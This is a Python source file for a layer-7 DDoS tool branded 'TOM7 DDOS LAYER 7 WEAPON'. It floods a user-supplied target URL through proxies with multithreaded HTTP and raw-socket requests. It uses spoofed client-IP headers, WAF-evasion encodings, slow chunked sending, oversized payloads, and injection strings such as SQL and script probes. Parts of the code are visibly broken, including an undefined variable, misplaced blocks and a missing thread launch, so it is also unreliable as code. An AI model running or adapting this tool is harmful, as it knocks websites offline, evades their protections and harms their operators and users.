try:
  import requests
  import threading
  import socket
  import ssl
  import httpx
  import urllib.parse
  import urllib3
  import string
  import random
  import itertools
  import signal
  import json
  import os
  import sys
  import colorama
  import time
  from urllib.parse import urlparse, quote, unquote, quote_plus, parse_qs, urlencode
  from itertools import cycle
  from colorama import Back, Style, Fore, init
except ModuleNotFoundError as e:
  print(f"REQUIRED MODULE {e} NOT INSTALLED")
  exit()


urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

init(autoreset=True)

#Global Variables
useragent = []
proxychain_initial = []
good_proxies = []
referer = []
stats = {
  "sent": 0,
  "errors": {"timeout": 0, "proxy": 0, "connection": 0, "http_error": 0, "other": 0},
  "status_codes": {}
}

lock = threading.Lock()
stop_event = threading.Event()
spinner = cycle(['|', '/', '-', '\\'])
attack_intensity = "medium"
attack_strategy = "default"

#Utilities
def cleargui():
  os.system("cls" if os.name == "nt" else "clear")

def dinamicsgui(startgui):
  cleargui()
  print(f"\n\n\n{Fore.LIGHTRED_EX}{startgui}...")
  time.sleep(1)

current_date = time.strftime("%Y-%m-%d")

#GUI LOGO
XBanner = f"""
TOM7 DDOS
LAYER 7 WEAPON
"""

#REQUIREMENT FILE
UA_FILE = 'UA.txt'
PROXY_FILE = 'Proxy.txt'
REFERER_FILE = 'Referer.txt'

def docloader(filename, is_proxy_list=False):
  global good_proxies
  try:
    loaded_items = []
    if not os.path.exists(filename):
      print(f'{Fore.YELLOW}[WARN]{Fore.RESET} File {filename} not found, skipping.')
      return []

    with open(filename, 'r', encoding='utf-8', errors='ignore') as f:
      for line in f:
        item = line.strip()
        if item and not item.startswith("#"):
          if is_proxy_list:
            if "://" in item:
              loaded_items.append(item)
            else:
              loaded_items.append(item)
    if not loaded_items and filename in [UA_FILE, PROXY_FILE, REFERER_FILE]:
      print(f'{Fore.YELLOW}[WARN]{Fore.RESET} No valid items found or all lines malformed in {filename}.')
    return loaded_items
  except FileNotFoundError:
    print(f'{Fore.RED}[ERR]{Fore.RESET} Required File {filename} Not Found (Exception).')
    if filename in [UA_FILE, PROXY_FILE, REFERER_FILE]:
      exit()
      return []
  except Exception as e:
    print(f'{Fore.RED}[ERR]{Fore.RESET} Error loading {filename}: {e}')
    if filename in [UA_FILE, PROXY_FILE, REFERER_FILE]:
      exit()
      return []

def check_url_format(url):
  return bool(urlparse(url).scheme and urlparse(url).netloc)

def initial_url_check(url):
  print(f"\n{Back.YELLOW}{Fore.BLACK}[!]{Back.RESET}{Fore.GREEN} CHECKING TARGET REACHABILITY....")
  try:
    with httpx.Client(verify=False, timeout=7, follow_redirects=True) as client:
      r = client.head(url)
      print(f"{Fore.GREEN}[INFO]{Fore.RESET} Target {Fore.YELLOW}{url}{Fore.GREEN} responded with {r.status_code}.")
      return r.status_code < 500
  except httpx.RequestError:
    print(f"{Fore.RED}[ERR]{Fore.RESET} Target {Fore.YELLOW}{url}{Fore.RED} is not reachable or invalid (RequestError).")
  except Exception:
    print(f"{Fore.RED}[ERR]{Fore.RESET} Target {Fore.YELLOW}{url}{Fore.RED} check failed (Unknown Error).")
    return False

def get_random_proxy():
  if not good_proxies:
    if not proxychain_initial:
      return None
      return random.choice(proxychain_initial)
  return random.choice(good_proxies)


def update_stats(sent=0, error_type=None, status_code=None):
  with lock:
    if sent:
      stats["sent"] += sent
    if error_type:
      stats["errors"][error_type] = stats["errors"].get(error_type, 0) + 1
    if status_code:
      stats["status_codes"][status_code] = stats["status_codes"].get(status_code, 0) + 1

def random_case_string(s):
  return "".join(random.choice([c.upper(), c.lower()]) for c in s)

def percent_encode_char(char_to_encode):
  if len(char_to_encode) == 1:
    return f"%{ord(char_to_encode):02x}"
  return char_to_encode

def selective_url_encode(s, intensity="medium", full_encode_chance=0.1, double_encode_chance=0.1):
  if not s:
    return ""
  if random.random() < double_encode_chance and intensity in ["medium", "high"]:
    try:
      s = quote(quote(s, safe=''), safe='')
      if random.random() < 0.5 and intensity == "high":
        s = s.replace("%25", "%")
    except Exception:
      pass
  elif random.random() < full_encode_chance and intensity == "high":
    return "".join(percent_encode_char(c) for c in s)

  encoded_s = []
  for char in s:
    if not char.isalnum() and char not in ['-', '_', '.', '~']:
      rand_val = random.random()
      threshold = {"low": 0.2, "medium": 0.5, "high": 0.9}.get(intensity, 0.5)
      if rand_val < threshold:
        encoded_s.append(percent_encode_char(char))
      elif intensity == "high" and rand_val < threshold + 0.1 and 0 <= ord(char) <= 0xFFFF:
        escaped_char = f"%u{ord(char):04x}"
        encoded_s.append(escaped_char)
      else:
        encoded_s.append(char)
    else:
      encoded_s.append(char)
  return "".join(encoded_s)

def unicode_escape_string(s, intensity="medium"):
  if not s:
    return ""
  escaped_s = []
  for char in s:
    rand_val = random.random()
    threshold = {"low": 0.1, "medium": 0.3, "high": 0.7}.get(intensity, 0.3)
    if (ord(char) > 126 or random.random() < 0.2) and rand_val < threshold:
      if 0 <= ord(char) <= 0xFFFF:
        escaped_s.append(f"%u{ord(char):04x}")
      else:
        escaped_s.append(char)
    else:
      escaped_s.append(char)
  return "".join(encoded_s)

def generate_waf_evasion_headers(target_host, intensity="medium", strategy="default"):
  h = {}
  spoofed_ip_1 = ".".join(str(random.randint(1,254)) for _ in range(4))
  spoofed_ip_2 = ".".join(str(random.randint(10,192))+".168."+str(random.randint(1,254))+"."+str(random.randint(1,254)))
  spoofed_ip_3 = ".".join(str(random.randint(1,254)) for _ in range(4))

  h.update({
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "Accept-Language": random.choice(["en-US,en;q=0.5", "en-GB,en;q=0.7,es;q=0.3", "de-DE,de;q=0.9,en;q=0.4"]),
    "Accept-Encoding": "gzip, deflate, br",
    "Upgrade-Insecure-Requests": "1",
    "Sec-Fetch-Dest": "document",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-Site": random.choice(["none", "same-origin", "cross-site"]),
    "Sec-Fetch-User": "?1",
    "TE": "trailers",
  })

  if random.random() < 0.7:
    h["Sec-CH-UA"] = random.choice([
      '"Not/A)Brand";v="99", "Google Chrome";v="115", "Chromium";v="115"',
      '"Microsoft Edge";v="114", "Chromium";v="114", "Not=A?Brand";v="24"',
      '"Firefox";v="116"',
    ])
    h["Sec-CH-UA-Mobile"] = random.choice(["?0", "?1"])
    h["Sec-CH-UA-Platform"] = random.choice(['"Windows"', '"Linux"', '"macOS"', '"Android"'])

    xff_chain = [spoofed_ip_1]

    if intensity != "low" or strategy == "header_focused":
      xff_chain.append(spoofed_ip_2)
      if intensity == "high" or strategy == "header_focused":
        xff_chain.append(spoofed_ip_3)
    random.shuffle(xff_chain)
    h["X-Forwarded-For"] = ", ".join(xff_chain)
    if intensity != "low" or strategy == "header_focused":
      more_x_headers = {
        "X-Real-IP": spoofed_ip_1,
        "X-Client-IP": spoofed_ip_1,
        "X-Remote-IP": spoofed_ip_1,
        "CF-Connecting-IP": spoofed_ip_1,
        "True-Client-IP": spoofed_ip_1,
        "Forwarded": f"for={spoofed_ip_1};host={target_host};proto=https;by={spoofed_ip_2}"
      }

      for xh_k, xh_v in more_x_headers.items():
        if random.random() < (0.4 if intensity=="medium" else 0.7 if intensity=="high" else 0.2):
          h[xh_k] = xh_v

    if (intensity == "high" or strategy == "header_focused") and random.random() < 0.5:
      h["X-HTTP-Method-Override"] = random.choice(["POST", "PUT", "DELETE", "PATCH"])
      h["X-Method-Override"] = h["X-HTTP-Method-Override"]

    if intensity != "low" and random.random() < 0.4:
      url_part = "".join(random.choices(string.ascii_lowercase + string.digits + "/%.-", k=random.randint(15,40)))
      h["X-Original-URL"] = "/" + url_part
      if random.random() < 0.5:
        h["X-Rewrite-URL"] = "/" + url_part

    if (intensity == "high" or strategy == "aggressive_payload") and random.random() < 0.3:
      boundary = "----WebKitFormBoundary" + "".join(random.choices(string.ascii_letters + string.digits, k=16))
      h["Content-Type"] = random.choice([
        f"application/json;charset={random.choice(['UTF-8', 'utf-8', 'iso-8859-1'])}",
        f"application/x-www-form-urlencoded; charset={random.choice(['UTF-8', 'iso-8859-1'])}",
        f"text/xml; charset={random.choice(['UTF-16BE', 'utf-8'])}",
        f"multipart/form-data; boundary={boundary}",
        "application/soap+xml; charset=utf-8",
        "application/graphql"
      ])

    if intensity != "low":
      h["Cache-Control"] = random.choice(["no-cache, no-store, must-revalidate, private", "max-age=0, no-cache", "public, max-age=600"])
      h["Pragma"] = "no-cache"
      h["Expires"] = random.choice(["0", "-1", "Thu, 01 Dec 1994 16:00:00 GMT"])

    if intensity == "high" and strategy != "stealth":
      for _ in range(random.randint(2,5)):
        header_name_junk = "".join(random.choices(string.ascii_letters, k=random.randint(1,3)))
        h[f"X-Tom7-Junk-{header_name_junk}"] = selective_url_encode(generate_mixed_string_payload(random.randint(20,50)), intensity)

    if strategy == "header_focused":
      items = list(h.items())
      random.shuffle(items)
      h = dict(items)
    return h

def generate_complex_json_payload(depth=3, keys_per_level=3, string_length=20):
  if depth < 0: return "".join(random.choices(string.ascii_letters + string.digits, k=max(1,string_length)))
  d = {}
  for i in range(keys_per_level):
    key = f"key_{''.join(random.choices(string.ascii_lowercase, k=5))}_{i}"
    rand_val = random.random()
    if rand_val < 0.3:
      d[key] = generate_complex_json_payload(depth - 1, keys_per_level, string_length)
    elif rand_val < 0.6:
      d[key] = [generate_complex_json_payload(depth - 1, keys_per_level, string_length) for _ in range(random.randint(1,2))]
    elif rand_val < 0.8:
      d[key] = random.randint(0, 10000)
    elif rand_val < 0.9:
      d[key] = random.choice([True, False, None])
    else:
      d[key] = "".join(random.choices(string.ascii_letters + string.digits + "!@#$%^&*()_+", k=max(1,string_length)))
  return d


def generate_mixed_string_payload(length=1024):
  chars = list(string.ascii_letters + string.digits + string.punctuation)
  return "".join(random.choices(chars, k=max(1,length)))

def generate_advanced_payload(payload_type="mixed_string", intensity="medium", strategy="default", max_size_kb=5):
  max_len = max(128, max_size_kb * 1024)

  if strategy == "aggressive_payload":
    payload_type = random.choice(["deep_json", "large_form", "problematic_string", "xml_like", "graphql_like"])
  elif strategy == "stealth" and payload_type not in ["small_json", "small_form"]:
    payload_type = random.choice(["small_json", "small_form"])
  if payload_type == "deep_json":
    depth = {"low": 2, "medium": 4, "high": 7}.get(intensity, 4)
    keys = {"low": 2, "medium": 3, "high": 6}.get(intensity, 3)
    str_len_base = {"low": 20, "medium": 60, "high": 150}.get(intensity, 60)
    str_len = max(10, min(str_len_base, max_len // (keys**depth if keys > 0 and depth > 0 and keys**depth > 0 else 1) if max_len > 0 else str_len_base))
    return generate_complex_json_payload(depth, keys, str_len)
  elif payload_type == "large_form":
    num_fields = {"low": 10, "medium": 60, "high": 200}.get(intensity, 60)
    form_data = {}
    current_total_len = 0
    for i in range(num_fields):
      key_len = random.randint(4,12)
      avg_remaining_len_per_field = (max_len - current_total_len) // (num_fields - i) if (num_fields - i) > 0 else (max_len - current_total_len)
      val_len = random.randint(10, max(20, int(avg_remaining_len_per_field * 0.8) if avg_remaining_len_per_field > 10 else 20 ))
      val_len = min(val_len, max_len - current_total_len - key_len - 30)
      if val_len <= 0:
        break
      key_name = f"field_{''.join(random.choices(string.ascii_lowercase,k=key_len))}_{i}"
      if intensity == "high" and random.random() < 0.3:
        key_name = selective_url_encode(key_name, "medium")
        form_data[key_name] = generate_mixed_string_payload(val_len)
      if intensity == "high" and random.random() < 0.4:
        form_data[key_name] = unicode_escape_string(form_data[key_name], "high")
        current_total_len += key_len + val_len
        if current_total_len >= max_len * 0.95:
          break
    return form_data
  elif payload_type == "problematic_string":
    length = {"low": 256, "medium": 1024, "high": min(max_len, 5120)}.get(intensity, 1024)
    base_str = generate_mixed_string_payload(length)
    if intensity != "low":
      base_str = unicode_escape_string(base_str, intensity)
    if intensity == "high":
      entities = ["&lt;", "&gt;", "&amp;", "&quot;", "&#x27;", "&#60;", "&#000;", "<![CDATA[ ]] >", "", "' OR '1'='1", "<script>alert(1)</script>"]
      for _ in range(min(len(base_str) // 80, 10)):
        if len(base_str) < max_len - 30:
          idx = random.randint(0, len(base_str))
          base_str = base_str[:idx] + random.choice(entities) + base_str[idx:]
    return base_str[:max_len]
  elif payload_type == "xml_like":
    num_elements = {"low": 5, "medium": 15, "high": 30}.get(intensity, 15)
    xml_str = "<?xml version=\"1.0\" encoding=\"UTF-8\"?><root>"
    for i in range(num_elements):
      tag_name = "".join(random.choices(string.ascii_lowercase, k=random.randint(3,7)))
      content = generate_mixed_string_payload(random.randint(20,100))
      if intensity == "high" and random.random() < 0.5:
        content = unicode_escape_string(content, "high")
      xml_str += f"<{tag_name}>{content}</{tag_name}>"
      if len(xml_str) > max_len * 0.9:
        break
      xml_str += "</root>"
    return xml_str[:max_len]
  elif payload_type == "graphql_like":
    num_fields = {"low": 3, "medium": 7, "high": 15}.get(intensity, 7)
    query = "query TestQuery { "
    for i in range(num_fields):
      field_name = "".join(random.choices(string.ascii_lowercase, k=random.randint(4,8)))
      query += f"{field_name} "
      if random.random() < 0.5:
        num_args = random.randint(1,3)
        args = []
        for j in range(num_args):
          arg_name = "".join(random.choices(string.ascii_lowercase, k=3))
          arg_val = random.choice([f'"{generate_mixed_string_payload(random.randint(5,15))}"', str(random.randint(1,100))])
          args.append(f"{arg_name}: {arg_val}")
        query += f"({', '.join(args)}) "
      if random.random() < 0.3 and i < num_fields -1:
        query += "{ " + "".join(random.choices(string.ascii_lowercase, k=5)) + " } "
      if len(query) > max_len * 0.9:
        break
    query += "}"
    return query[:max_len]
  elif payload_type in ["small_json", "small_form"]:
    return generate_complex_json_payload(1,2,15) if "json" in payload_type else {f"param_{k}":
      generate_mixed_string_payload(random.randint(5,20)) for k in range(random.randint(2,4))}
  length = {"low": 512, "medium": min(max_len, 2048), "high": min(max_len, 10240)}.get(intensity, min(max_len, 2048))
  return generate_mixed_string_payload(length)

def execute_flood(target_url, method, target_details):
  global attack_intensity, attack_strategy
  current_proxy = get_random_proxy()
  proxies_dict = {"http://": current_proxy, "https://":
    current_proxy} if current_proxy else None
  parsed_target_url = urlparse(target_url)
  original_host_header = parsed_target_url.netloc
  original_scheme = parsed_target_url.scheme
  path_segments = [seg for seg in (parsed_target_url.path or "/").split('/') if seg]
  obfuscated_path_segments = [selective_url_encode(seg, intensity=attack_intensity, full_encode_chance=0.3 if attack_intensity=="high" else 0.1, double_encode_chance=0.2 if attack_intensity=="high" else 0.05) for seg in path_segments]

  if (attack_intensity == "high" or attack_strategy == "aggressive_payload") and random.random() < 0.4:
    junk_path_elements = ["uploads", "temp", ".git", "wp-admin", "..%252f..%252f", "%252e%252e%252f", "api/v1", "".join(random.choices(string.ascii_lowercase, k=random.randint(4,7)))]
    for _ in range(random.randint(1,3 if attack_intensity=="high" else 1)):
      idx_to_insert = random.randint(0, len(obfuscated_path_segments)) if obfuscated_path_segments else 0
      obfuscated_path_segments.insert(idx_to_insert, random.choice(junk_path_elements))

  final_path = "/" + "/".join(obfuscated_path_segments)
  final_path = final_path.replace("//", "/")

  num_base_params = random.randint(1, {"low":2, "medium":5, "high":8}.get(attack_intensity,5))
  if attack_strategy == "stealth":
    num_base_params = random.randint(1,3)
    query_dict = {}
    for i in range(num_base_params):
      param_key_base = "".join(random.choices(string.ascii_lowercase, k=random.randint(3,7)))
      param_val_str = generate_mixed_string_payload(random.randint(10, {"low":40, "medium":80, "high":150}.get(attack_intensity,80)))
      obf_key = selective_url_encode(param_key_base, attack_intensity)
      if (attack_intensity == "high" or attack_strategy == "header_focused") and random.random() < 0.5:
        obf_key = random_case_string(obf_key)
      obf_val = selective_url_encode(param_val_str, attack_intensity, full_encode_chance=0.4 if attack_intensity=="high" else 0.15, double_encode_chance=0.3 if attack_intensity=="high" else 0.1)
      if (attack_intensity != "low" or attack_strategy == "aggressive_payload") and random.random() < 0.6:
        obf_val = unicode_escape_string(obf_val, attack_intensity)
      query_dict[obf_key] = obf_val
    if method in ["GET", "HEAD"] and (attack_intensity == "high" or attack_strategy == "aggressive_payload") and random.random() < 0.5:
      extra_payload_type = random.choice(["large_form", "deep_json_as_query", "problematic_string_as_query", "xml_like", "graphql_like"])
      large_query_payload_content = generate_advanced_payload(extra_payload_type, "medium", attack_strategy, max_size_kb=2)
      if isinstance(large_query_payload_content, dict):
        for k,v in large_query_payload_content.items():
          query_dict[selective_url_encode(k, "low")] = selective_url_encode(str(v), "low")
      else:
        query_dict[f"big_blob_{random.randint(1,100)}"] = selective_url_encode(str(large_query_payload_content), "medium")
        final_query_string = urlencode(query_dict, doseq=True, quote_via=lambda s,sf,e,er: s if isinstance(s, str) and '%' in s else quote_plus(s) )
        url_to_hit = urllib.parse.urlunparse((original_scheme, original_host_header, final_path, '', final_query_string, ''))
        req_headers = {"Host": original_host_header, "Connection": "keep-alive"}
        req_headers.update(generate_waf_evasion_headers(original_host_header, attack_intensity, attack_strategy))
        if useragent:
          req_headers["User-Agent"] = random.choice(useragent)
        else:
          req_headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0"
        if referer:
          req_headers["Referer"] = random.choice(referer)
        else:
          req_headers["Referer"] = f"{original_scheme}://{original_host_header}/"

        body_payload_content = None
        chosen_payload_type_for_body = "mixed_string"

        if method in ["POST", "PUT", "JSON", "JSON_HTTPX"]:
          if attack_strategy == "stealth":
            chosen_payload_type_for_body = random.choice(["small_json", "small_form"])
          elif attack_strategy == "aggressive_payload" or attack_intensity == "high":
            chosen_payload_type_for_body = random.choice(["deep_json", "large_form", "problematic_string", "xml_like", "graphql_like", "mixed_string"])
          else:
            chosen_payload_type_for_body = random.choice(["deep_json", "large_form", "mixed_string"])

          body_payload_content = generate_advanced_payload(chosen_payload_type_for_body, attack_intensity, attack_strategy, max_size_kb=15 if attack_intensity == "high" else 5)

          if "Content-Type" not in req_headers:
            if chosen_payload_type_for_body in ["deep_json", "small_json"] or method in ["JSON", "JSON_HTTPX"]:
              req_headers["Content-Type"] = "application/json; charset=utf-8"
            elif chosen_payload_type_for_body in ["large_form", "small_form"]:
              req_headers["Content-Type"] = "application/x-www-form-urlencoded; charset=utf-8"
            elif chosen_payload_type_for_body in ["large_form", "small_form"]:
              req_headers["Content-Type"] = "application/x-www-form-urlencoded; charset=utf-8"
            elif chosen_payload_type_for_body == "xml_like":
              req_headers["Content-Type"] = "application/xml; charset=utf-8"
            elif chosen_payload_type_for_body == "graphql_like":
              req_headers["Content-Type"] = "application/json; charset=utf-8"
              body_payload_content = {"query": str(body_payload_content)}
            else:
              req_headers["Content-Type"] = "text/plain; charset=utf-8"
        if method in ["JSON", "JSON_HTTPX"] or req_headers.get("Content-Type","").startswith("application/json"):
          if isinstance(body_payload_content, str):
            try:
              body_payload_content = json.loads(body_payload_content)
            except:
              body_payload_content = {"data_blob": body_payload_content}
        elif not isinstance(body_payload_content, (dict, str, list, bytes)):
          body_payload_content = str(body_payload_content)
        try:
          if method in ["GET", "POST", "PUT", "JSON", "HEAD", "DELETE"]:
            with requests.Session() as s:
              s.headers.update(req_headers)
              if proxies_dict:
                s.proxies.update(proxies_dict)
              request_kwargs = {'timeout': 10, 'verify': False}
              if method == "GET":
                r = s.get(url_to_hit, **request_kwargs)
              elif method == "POST":
                if req_headers.get("Content-Type","").startswith("application/json"):
                  r = s.post(url_to_hit, json=body_payload_content, **request_kwargs)
                else:
                  r = s.post(url_to_hit, data=body_payload_content, **request_kwargs)
              elif method == "PUT":
                if req_headers.get("Content-Type","").startswith("application/json"):
                  r = s.put(url_to_hit, json=body_payload_content, **request_kwargs)
                else:
                  r = s.put(url_to_hit, data=body_payload_content, **request_kwargs)
              elif method == "JSON":
                r = s.post(url_to_hit, json=body_payload_content if isinstance(body_payload_content, (dict, list)) else {"data": body_payload_content}, **request_kwargs)
              elif method == "HEAD":
                r = s.head(url_to_hit, **request_kwargs)
              elif method == "DELETE":
                r = s.delete(url_to_hit, **request_kwargs)
              update_stats(sent=1, status_code=r.status_code)
          elif method in ["HTTPX", "JSON_HTTPX"]:
            with httpx.Client(http2=True, headers=req_headers, proxies=proxies_dict, timeout=10, verify=False, follow_redirects=True) as client:
              if method == "JSON_HTTPX":
                r = client.post(url_to_hit, json=body_payload_content if isinstance(body_payload_content, (dict, list)) else {"data": body_payload_content})
              elif method == "HTTPX":
                if body_payload_content:
                  if req_headers.get("Content-Type","").startswith("application/json"):
                    r = client.post(url_to_hit, json=body_payload_content)
                  else:
                    r = client.post(url_to_hit, data=body_payload_content)
                else:
                  r = client.get(url_to_hit)
                  update_stats(sent=1, status_code=r.status_code)
              elif method == "HTTPFlood":
                parsed_hit_url = urlparse(url_to_hit)
                sock_host = parsed_hit_url.hostname
                sock_port = parsed_hit_url.port if parsed_hit_url.port else (443 if parsed_hit_url.scheme == "https" else 80)
                sock_path = (parsed_hit_url.path or "/") + ("?" + parsed_hit_url.query if parsed_hit_url.query else "")
                http_socket_method = random.choice(['GET', 'POST', 'PUT', 'HEAD', 'OPTIONS', 'TRACE', 'PATCH'])
                raw_req_lines = [f"{http_socket_method} {sock_path} HTTP/1.1"]
                current_socket_headers = req_headers.copy()
                current_socket_headers['Host'] = sock_host
                raw_body_bytes = b""
                if http_socket_method in ['POST', 'PUT', 'PATCH'] and body_payload_content:
                  content_type_header = current_socket_headers.get("Content-Type","text/plain; charset=utf-8")
                  if isinstance(body_payload_content, (dict, list)) and "application/json" in content_type_header:
                    body_str = json.dumps(body_payload_content)
                  elif isinstance(body_payload_content, dict) and "application/x-www-form-urlencoded" in content_type_header:
                    body_str = urlencode(body_payload_content)
                  else:
                    body_str = str(body_payload_content)
                    raw_body_bytes = body_str.encode('utf-8', errors='backslashreplace')
                    current_socket_headers['Content-Length'] = str(len(raw_body_bytes))
                for h_key, h_val in current_socket_headers.items():
                  raw_req_lines.append(f"{h_key}: {str(h_val)}")
                  raw_request_header_part = "\r\n".join(raw_req_lines) + "\r\n\r\n"
                  raw_request_bytes = raw_request_header_part.encode('utf-8', errors='backslashreplace') + raw_body_bytes
                  sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                  sock.settimeout(7)
                  if sock_port == 443:
                    context = ssl.create_default_context()
                    context.check_hostname = False
                    context.verify_mode = ssl.CERT_NONE
                    sock = context.wrap_socket(sock, server_hostname=sock_host)
                  sock.connect((sock_host, sock_port))
                  send_iterations = 1
                  if attack_strategy == "aggressive_payload" and http_socket_method in ['POST','PUT','PATCH']:
                    send_iterations = random.randint(1,3)

                    for _ in range(send_iterations):
                      if (attack_intensity == "high" or attack_strategy == "stealth") and random.random() < 0.4 and len(raw_request_bytes)>20:
                        header_bytes_for_slow_send = raw_request_header_part.encode('utf-8', errors='backslashreplace')
                        for i_chunk in range(0, len(header_bytes_for_slow_send), random.randint(15,40)):
                          sock.sendall(header_bytes_for_slow_send[i_chunk : i_chunk + random.randint(15,40)])
                          time.sleep(random.uniform(0.001, 0.015))
                        if raw_body_bytes:
                          for i_chunk in range(0, len(raw_body_bytes), random.randint(20, 70)):
                            sock.sendall(raw_body_bytes[i_chunk : i_chunk + random.randint(20, 70)])
                            time.sleep(random.uniform(0.001, 0.015))
                        else:
                          sock.sendall(raw_request_bytes)
                  sock.close()
                  update_stats(sent=1)

        except requests.exceptions.Timeout:
          update_stats(error_type="timeout")
        except requests.exceptions.ProxyError:
          update_stats(error_type="proxy")
        except requests.exceptions.ConnectionError:
          update_stats(error_type="connection")
        except requests.exceptions.RequestException:
          update_stats(error_type="http_error")
        except httpx.TimeoutException: update_stats(error_type="timeout")
        except httpx.ProxyError:
          update_stats(error_type="proxy")
        except httpx.ConnectError:
          update_stats(error_type="connection")
        except httpx.RequestError:
          update_stats(error_type="http_error")
        except (socket.timeout, ssl.SSLError, ssl.SSLWantReadError, ssl.SSLWantWriteError):
          update_stats(error_type="timeout")
        except socket.error:
          update_stats(error_type="connection")
        except Exception:
          update_stats(error_type="other")

def attack_thread_worker(url, method, target_details):
  while not stop_event.is_set():
    execute_flood(url, method, target_details)

def monitor_thread_worker(target_ip, target_port):
  start_time = time.time()
  last_sent_count = 0
  last_time = start_time
  while not stop_event.is_set():
    time.sleep(1)
    if stop_event.is_set():
      break
    with lock:
      current_sent = stats["sent"]
      current_errors_copy = dict(stats["errors"])
      current_status_codes_copy = dict(stats["status_codes"])
      now = time.time()
      elapsed_time = now - start_time
      interval_time = now - last_time
    if interval_time == 0:
      interval_time = 1
      rps = (current_sent - last_sent_count) / interval_time
      last_sent_count = current_sent
      last_time = now
      error_summary = ", ".join([f"{k}: {v}" for k,v in current_errors_copy.items() if v > 0])
      status_summary = ", ".join([f"HTTP_{k}: {v}" for k,v in sorted(current_status_codes_copy.items())])
    sys.stdout.write(
      f"\r{Fore.CYAN} {next(spinner)} "
      f"{Fore.WHITE}Sent: {Fore.GREEN}{current_sent} "
      f"{Fore.MAGENTA}RPS: {rps:.2f} "
      f"{Fore.BLUE}Target: {target_ip}:{target_port} "
      f"{Fore.RED}Errors: [{error_summary if error_summary else 'None'}] "
      f"{Fore.YELLOW}Status: [{status_summary if status_summary else 'N/A'}]"
      f"{Style.RESET_ALL}"
    )
    sys.stdout.flush()

def signal_handler(sig, frame):
  print(f"\n{Fore.YELLOW}[INFO] Shutdown signal received. Stopping threads...")
  stop_event.set()

if __name__ == "__main__":
  signal.signal(signal.SIGINT, signal_handler)
  dinamicsgui("Loading User Agents")
  useragent = docloader(UA_FILE)
  dinamicsgui("Loading Proxies")
  proxychain_initial = docloader(PROXY_FILE, is_proxy_list=True)
  if proxychain_initial:
    good_proxies.extend(proxychain_initial)
    print(f"{Fore.GREEN}[INFO]{Fore.RESET} Loaded {len(good_proxies)} proxies.")
  else:
    print(f"{Fore.YELLOW}[WARN]{Fore.RESET} No proxies loaded. Attack will run direct.")
  dinamicsgui("Loading Referers")
  referer = docloader(REFERER_FILE)

  cleargui()
  print(XBanner)
  print(f'{Fore.GREEN} [!] User Agents: {Fore.MAGENTA}{len(useragent)} {Fore.GREEN} Proxies: {Fore.YELLOW}{len(good_proxies)} {Fore.GREEN} Referers: {Fore.MAGENTA}{len(referer)}')

  target_url = ""
  while True:
    target_url = input(f"\n{Back.RED}{Fore.BLACK}TARGET URL{Back.RESET}{Fore.BLUE} ➜{Fore.YELLOW} ").strip()
    if not check_url_format(target_url):
      print(f"\n{Back.RED}{Fore.BLACK}[-]{Back.RESET}{Fore.RED} Invalid URL format.")
      continue
    if initial_url_check(target_url):
      break
    else:
      if input(f"{Fore.YELLOW}Target check failed. Continue anyway? (y/N): {Fore.RESET}").lower() != 'y':
        target_url = ""
      else:
        print(f"{Fore.YELLOW}[WARN] Proceeding despite check failure.{Fore.RESET}")
      break
  if not target_url:
    print(f"{Fore.RED}No valid target URL. Exiting.")
    exit()

  target_details = {}

  try:
    parsed_target = urlparse(target_url)
    target_details["host"] = parsed_target.hostname
    assert target_details["host"]
    target_details["ip"] = socket.gethostbyname(target_details["host"])
    target_details["port"] = parsed_target.port or (443 if parsed_target.scheme == "https" else 80)
  except Exception as e:
    print(f"{Fore.RED}[ERR]{Fore.RESET} URL/Hostname error: {e}")
    exit()

  intensity_options = {"1": "low", "2": "medium", "3": "high"}

  while True:
    print(f"\n{Back.CYAN}{Fore.BLACK}SELECT ATTACK INTENSITY (more evasions, complex payloads){Back.RESET}")
    for k_intensity, v_intensity in intensity_options.items():
      print(f"{k_intensity}. {v_intensity.capitalize()}")
      choice = input(f"{Fore.GREEN}Intensity ➜ {Fore.YELLOW}")
      if choice in intensity_options:
        attack_intensity = intensity_options[choice]
        break
      else:
        print(f"{Fore.RED}Invalid intensity choice.")

  strategy_options = {"1": "default", "2": "stealth", "3": "aggressive_payload", "4": "header_focused"}

  while True:
    print(f"\n{Back.GREEN}{Fore.BLACK}SELECT ATTACK STRATEGY{Back.RESET}")
    print(f"{Fore.WHITE}1. Default (Balanced approach based on intensity)")
    print(f"{Fore.WHITE}2. Stealth (Try to mimic legitimate traffic, smaller payloads, less noisy headers)")
    print(f"{Fore.WHITE}3. Aggressive Payload (Focus on large/complex/problematic payloads)")
    print(f"{Fore.WHITE}4. Header Focused (Focus on diverse and evasive HTTP headers)")
    choice = input(f"{Fore.GREEN}Strategy ➜ {Fore.YELLOW}")
    if choice in strategy_options:
      attack_strategy = strategy_options[choice]
      break
    else:
      print(f"{Fore.RED}Invalid strategy choice.")

  method_types = ["GET", "POST", "PUT", "JSON", "HEAD", "DELETE", "HTTPX", "JSON_HTTPX", "HTTPFlood"]
  attack_type = ""

  while True:
    print(f"\n{Back.BLUE}{Fore.BLACK}SELECT ATTACK TYPE{Back.RESET}")
    for i, m in enumerate(method_types, start=1):
      print(f"{Fore.WHITE}{i}. {Fore.GREEN}{m}")
      choice = input(f"\n{Back.MAGENTA}{Fore.BLACK}SELECT MODE{Back.RESET}{Fore.GREEN} ➜ {Fore.YELLOW}")
      if choice.isdigit() and 1 <= int(choice) <= len(method_types):
        attack_type = method_types[int(choice) - 1]
        break
      else:
        print(f"\n{Back.RED}{Fore.BLACK}[!]{Back.RESET}{Fore.MAGENTA} Invalid Mode ➜ {Fore.YELLOW}{choice}")
  threads_count = 0

  while True:
    try:
      threads_count = int(input(f"{Back.BLUE}{Fore.BLACK}[?]{Back.RESET}{Fore.BLUE}Thread Count ➜ {Fore.YELLOW}"))
      if threads_count > 0:
        break
      else:
        print(f"{Fore.RED}Thread count must be positive.")
    except ValueError:
      print(f"{Fore.RED}Invalid number.")
      print(f"\n{Back.YELLOW}{Fore.BLACK}[!]{Back.RESET}{Fore.RED} Preparing to attack {Fore.GREEN}{target_url}{Fore.YELLOW} ({target_details['ip']})")
